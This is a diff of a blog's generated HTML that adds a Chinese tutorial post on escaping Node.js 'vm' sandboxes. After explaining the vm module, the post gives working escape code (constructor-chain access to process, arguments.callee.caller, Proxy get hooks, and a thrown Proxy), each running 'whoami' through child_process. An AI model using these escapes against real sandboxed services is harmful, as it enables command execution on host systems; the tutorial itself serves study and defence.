@@ -13,18 +13,26 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/archives/"/>
+    <link rel="canonical" href="http://example.com/2024/12/02/vm沙箱逃逸/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/index.html">
+        <meta name="description" content="VM沙箱基本概念和使用什么是沙箱 沙箱就是我们开辟出的单独运行代码的环境，与主机相互隔离，从而使得代码并不会影响主机上的功能。 沙箱的使用 在nodejs中，我们可以通过引入vm和vm2模块来创建沙箱，由于vm太容易逃逸，安全性不高，所以后面发展出了vm2。 上下文对象：一个普通的js对象，里面有值有方法，将其传入沙箱就变成了上下文对象，里面的值和方法只对沙箱内生效。 vm模块常用的方法：  vm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VM沙箱逃逸">
+<meta property="og:url" content="http://example.com/2024/12/02/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="VM沙箱基本概念和使用什么是沙箱 沙箱就是我们开辟出的单独运行代码的环境，与主机相互隔离，从而使得代码并不会影响主机上的功能。 沙箱的使用 在nodejs中，我们可以通过引入vm和vm2模块来创建沙箱，由于vm太容易逃逸，安全性不高，所以后面发展出了vm2。 上下文对象：一个普通的js对象，里面有值有方法，将其传入沙箱就变成了上下文对象，里面的值和方法只对沙箱内生效。 vm模块常用的方法：  vm">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-bee778a902ca674182b5006a3c033c53_1440w.webp">
+<meta property="og:image" content="https://pica.zhimg.com/80/v2-9fef7a2117981e2599e97aa7bef7338a_1440w.webp">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-641c93cff14cd5abf9cc29a7c5767c5b_1440w.webp">
+<meta property="article:published_time" content="2024-12-02T11:48:17.342Z">
+<meta property="article:modified_time" content="2024-12-02T11:47:29.827Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picx.zhimg.com/80/v2-bee778a902ca674182b5006a3c033c53_1440w.webp">
     
     
     <!--- Icon Part-->
@@ -36,7 +44,7 @@
     
     <title>
         
-            Archive -
+            VM沙箱逃逸 -
         
         Saofe1a
     </title>
@@ -309,7 +317,7 @@
 
                             <li class="navbar-item">
                                 <!-- Menu -->
-                                <a class="active"
+                                <a class=""
                                    href="/archives/"
                                         >
                                     <i class="fa-regular fa-archive fa-fw"></i>
@@ -397,7 +405,7 @@
 
                     <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                         
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                            href="/archives/"
                         >
                             <span>
@@ -487,114 +495,264 @@
             <div class="main-content">
 
                 
-                    <div class="archive-container shadow-none hover:shadow-none sm:shadow-redefine sm:hover:shadow-redefine-hover">
-    
-<div class="archive-list-container">
-    
-        <section class="archive-item mb-spacing-unit last:mb-0">
-            <div class="archive-item-header flex flex-row items-center mb-2">
-                <span class="archive-year font-semibold text-3xl mr-2">2024</span>
-                <span class="archive-year-post-count text-xs md:text-sm font-bold rounded-small bg-third-background-color py-[2px] px-[10px] border border-border-color">8</span>
-            </div>
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
             
-            <ul class="article-list pl-0 md:pl-8 text-lg leading-[1.5]">
-                
-                    
-                    
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='12-02'>
-                    
-                    <a href="/2024/12/02/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">VM沙箱逃逸</span>
-                    </a>
-                    
-                
-                    
-                    
-                    <a href="/2024/12/02/Flask%E4%B9%8Bsession%E4%BC%AA%E9%80%A0/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Flask之session伪造</span>
-                    </a>
-                    
-                
-                    
-                    
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">VM沙箱逃逸</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/touxiang.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Saofe1a</span>
                         
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='10-17'>
-                    
-                    <a href="/2024/10/17/Flask%E8%AE%A1%E7%AE%97pin%E7%A0%81/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Flask计算pin码</span>
-                    </a>
-                    
-                
-                    
-                    
-                        
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='10-13'>
-                    
-                    <a href="/2024/10/13/php%E5%8F%82%E6%95%B0%E5%90%8D%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">php参数名解析特性</span>
-                    </a>
-                    
-                
-                    
-                    
-                        
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='10-10'>
-                    
-                    <a href="/2024/10/10/Thinkphp5.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96ajax%E9%93%BE/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Thinkphp5.1 反序列化ajax链</span>
-                    </a>
-                    
-                
-                    
-                    
-                        
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='10-07'>
-                    
-                    <a href="/2024/10/07/Thinkphp5--RCE/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Thinkphp5 RCE</span>
-                    </a>
-                    
-                
-                    
-                    
-                        
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='10-01'>
-                    
-                    <a href="/2024/10/01/Thinkphp3.2.3%20sql%E6%B3%A8%E5%85%A5/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Thinkphp3.2.3 sql注入</span>
-                    </a>
-                    
-                
-                    
-                    
-                        
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='07-19'>
-                    
-                    <a href="/2024/07/19/hello-world/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Hello World</span>
-                    </a>
-                    
-                
-                </li> <!-- Ensure the last item is properly closed -->
-            </ul>
-        </section>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-12-02 19:48:17</span>
+        <span class="mobile">2024-12-02 19:48:17</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-12-02 19:47:29</span>
+            <span class="mobile">2024-12-02 19:47:29</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.7k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>7 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
 
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="VM沙箱基本概念和使用"><a href="#VM沙箱基本概念和使用" class="headerlink" title="VM沙箱基本概念和使用"></a>VM沙箱基本概念和使用</h2><p><strong>什么是沙箱</strong></p>
+<p>沙箱就是我们开辟出的单独运行代码的环境，与主机相互隔离，从而使得代码并不会影响主机上的功能。</p>
+<p><strong>沙箱的使用</strong></p>
+<p>在nodejs中，我们可以通过引入vm和vm2模块来创建沙箱，由于vm太容易逃逸，安全性不高，所以后面发展出了vm2。</p>
+<p>上下文对象：一个普通的js对象，里面有值有方法，将其传入沙箱就变成了上下文对象，里面的值和方法只对沙箱内生效。</p>
+<p>vm模块常用的方法：</p>
+<ul>
+<li><p><code>vm.runinThisContext(code)</code>：在<strong>当前global</strong>下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。</p>
+</li>
+<li><p><code>vm.createContext([sandbox])</code>： 在使用前需要先创建一个上下文对象，再将上下文对象传给该方法（如果没有则会生成一个空的上下文对象），v8为这个上下文对象在当前global外再创建一个作用域，此时这个上下文对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</p>
+</li>
+<li><p><code>vm.runInContext(code, contextifiedSandbox[, options])</code>：参数为要执行的代码和创建完作用域的上下文对象，代码会在传入的上下文对象中执行，并且参数的值与上下文内的参数值相同。</p>
+</li>
+<li><p><code>vm.runInNewContext(code[, sandbox][, options])</code>: creatContext和runInContext的结合版，传入要执行的代码和上下文对象。</p>
+</li>
+<li><p><code>vm.Script类</code> vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</p>
+</li>
+<li><p><code>new vm.Script(code, options)</code>：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行，也就是写成了一个脚本。</p>
+</li>
+</ul>
+<p>简单来说，除了runinThisContext，其他沙箱内都无法访问到global属性。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);  <span class="comment">// 引入 Node.js 内置模块 util  </span></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);      <span class="comment">// 引入 Node.js 内置模块 vm  </span></span><br><span class="line">  </span><br><span class="line"><span class="variable language_">global</span>.<span class="property">age</span> = <span class="number">3</span>;               <span class="comment">// 将全局变量 age 赋值为 3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> sandbox = &#123; <span class="attr">age</span>: <span class="number">1</span> &#125;;   <span class="comment">// 创建一个上下文对象 sandbox 并将其 age 属性赋值为 1  </span></span><br><span class="line">vm.<span class="title function_">createContext</span>(sandbox);     <span class="comment">// 创建一个沙盒运行环境，将上下文对象作为其参数传入  </span></span><br><span class="line">  </span><br><span class="line">vm.<span class="title function_">runInContext</span>(<span class="string">&#x27;age *= 2;&#x27;</span>, sandbox);  <span class="comment">// 在指定的上下文中运行字符串代码，将 sandbox 中的 age 属性乘以 2  </span></span><br><span class="line">  </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox));     <span class="comment">// 输出 sandbox 对象的内容，结果为 &#123; age: 2 &#125;  </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(age));         <span class="comment">// 输出全局变量 age 的值，结果为 3</span></span><br></pre></td></tr></table></figure></div>
+
+<p>插播一下util模块的作用：Node.js 内置模块 <code>util</code> 提供了一些实用的函数，可以用于简化 JavaScript 编程中的一些常见任务。这些函数包括：</p>
+<ul>
+<li><code>util.format()</code>：类似于 <code>console.log()</code>，用于格式化输出字符串。</li>
+<li><code>util.inspect()</code>：用于将 JavaScript 对象转换为字符串形式，便于调试和输出。</li>
+<li><code>util.promisify()</code>：将基于回调的异步函数（例如 Node.js 中的许多 API）转换为返回 Promise 的函数，便于使用 <code>async/await</code>。</li>
+<li><code>util.inherits()</code>：用于实现对象之间继承关系的函数。</li>
+<li><code>util.types</code>：提供了一些常见 JavaScript 数据类型的判断函数，例如 <code>util.types.isDate()</code>、<code>util.types.isArray()</code> 等</li>
+</ul>
+<h2 id="VM沙箱逃逸"><a href="#VM沙箱逃逸" class="headerlink" title="VM沙箱逃逸"></a>VM沙箱逃逸</h2><p><strong>沙箱逃逸的原理与目标</strong></p>
+<p>逃逸的意思就是从沙箱这个封闭的环境中逃出来，**&#x3D;&#x3D;终极目标是获取全局对象global的全局变量process&#x3D;&#x3D;<strong>，因为有了process我们就可以在nodejs中进行命令执行，具体语句如下：&#x3D;&#x3D;</strong><code>process.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()</code>**&#x3D;&#x3D;</p>
+<p><strong>获取process的常见方法</strong></p>
+<p>这些方法使用于vm沙箱逃逸，同时奠定了vm2的沙箱逃逸基本思想。</p>
+<ul>
+<li><p><strong>通过this对象进行获取</strong></p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);  </span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return process&#x27;)()`</span>);<span class="comment">// 使用反引号包裹代码串可以更好执行  </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y1);</span><br></pre></td></tr></table></figure></div>
+<p> this对象指的是传进来的上下文对象本身，事实上这个对象并不属于沙箱环  境（因为它是在外面创建的）<br> 通过访问他的构造方法的构造器，我们得到了一个构造方法的构造器，并  构造一个方法体是<code>return process</code>的方法，并加上括号执行，我们就获得了process<br> 将第一个constructor替换成toString也是一样的，获得到沙箱外方法的构造器即可。</p>
+</li>
+<li><p><strong>this为null</strong><br>此时this-&gt;null，无法像之前一样逃逸，这时候就得用到函数的一个内置对象属性<code>arguments.callee.caller</code>,我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的arguments.callee.caller就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&#x27;vm&#x27;);  </span><br><span class="line">const script =   </span><br><span class="line">`(() =&gt; &#123;  </span><br><span class="line">    const a = &#123;&#125;  </span><br><span class="line">    a.toString = function () &#123;  </span><br><span class="line">      const cc = arguments.callee.caller;  </span><br><span class="line">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();  </span><br><span class="line">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()  </span><br><span class="line">    &#125;  </span><br><span class="line">    return a  </span><br><span class="line">  &#125;)()`;  </span><br><span class="line">  </span><br><span class="line">const sandbox = Object.create(null);  </span><br><span class="line">const context = new vm.createContext(sandbox);  </span><br><span class="line">const res = vm.runInContext(script, context);  </span><br><span class="line">console.log(&#x27;Hello &#x27; + res)</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picx.zhimg.com/80/v2-bee778a902ca674182b5006a3c033c53_1440w.webp"
+                     
+                ><br>成功执行了命令<br>分析一下这段代码，首先是箭头函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pica.zhimg.com/80/v2-9fef7a2117981e2599e97aa7bef7338a_1440w.webp"
+                     
+                ><br>重写了沙盒对象中的toString方法，然后再console.log触发，通过<code>arguments.callee.caller</code>获取到了一个沙盒外的对象，进而和上面一样获取process</p>
+</li>
+</ul>
+<h2 id="proxy劫持"><a href="#proxy劫持" class="headerlink" title="proxy劫持"></a>proxy劫持</h2><p>如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用Proxy来劫持属性</p>
+<p>proxy就是一个hook函数，在我们去访问对象的属性时（不管是否存在）都会触发这个函数</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&quot;vm&quot;);  </span><br><span class="line">  </span><br><span class="line">const script =   </span><br><span class="line">`  </span><br><span class="line">(() =&gt;&#123;  </span><br><span class="line">    const a = new Proxy(&#123;&#125;, &#123;  </span><br><span class="line">        get: function()&#123;  </span><br><span class="line">            const cc = arguments.callee.caller;  </span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();  </span><br><span class="line">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;)  </span><br><span class="line">    return a  </span><br><span class="line">&#125;)()  </span><br><span class="line">`;  </span><br><span class="line">const sandbox = Object.create(null);  </span><br><span class="line">const context = new vm.createContext(sandbox);  </span><br><span class="line">const res = vm.runInContext(script, context);  </span><br><span class="line">console.log(res.abc)</span><br></pre></td></tr></table></figure></div>
+<p>如上代码就是将对象a实例化为了一个Proxy对象，然后访问abc属性（不存在）触发get方法，进而导致命令执行</p>
+<h2 id="借助异常处理"><a href="#借助异常处理" class="headerlink" title="借助异常处理"></a>借助异常处理</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&quot;vm&quot;);  </span><br><span class="line">  </span><br><span class="line">const script =   </span><br><span class="line">`  </span><br><span class="line">    throw new Proxy(&#123;&#125;, &#123;  </span><br><span class="line">        get: function()&#123;  </span><br><span class="line">            const cc = arguments.callee.caller;  </span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();  </span><br><span class="line">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;)  </span><br><span class="line">`;  </span><br><span class="line">try &#123;  </span><br><span class="line">    vm.runInContext(script, vm.createContext(Object.create(null)));  </span><br><span class="line">&#125;catch(e) &#123;  </span><br><span class="line">    console.log(&quot;error:&quot; + e)   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>上述代码的返回值无法直接利用，应该说是没有返回值<br>这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picx.zhimg.com/80/v2-641c93cff14cd5abf9cc29a7c5767c5b_1440w.webp"
+                     
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> VM沙箱逃逸</li>
+        <li><strong>Author:</strong> Saofe1a</li>
+        <li><strong>Created at
+                :</strong> 2024-12-02 19:48:17</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-12-02 19:47:29
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://saofeia.github.io/2024/12/02/VM沙箱逃逸/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
 </div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/12/02/Flask%E4%B9%8Bsession%E4%BC%AA%E9%80%A0/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Flask之session伪造</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">VM沙箱逃逸</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#VM%E6%B2%99%E7%AE%B1%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%92%8C%E4%BD%BF%E7%94%A8"><span class="nav-text">VM沙箱基本概念和使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="nav-text">VM沙箱逃逸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#proxy%E5%8A%AB%E6%8C%81"><span class="nav-text">proxy劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%80%9F%E5%8A%A9%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="nav-text">借助异常处理</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
 
                 
 
@@ -680,6 +838,27 @@
         </div>
     </div>
 
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
     
 
     <div class="right-side-tools-container">
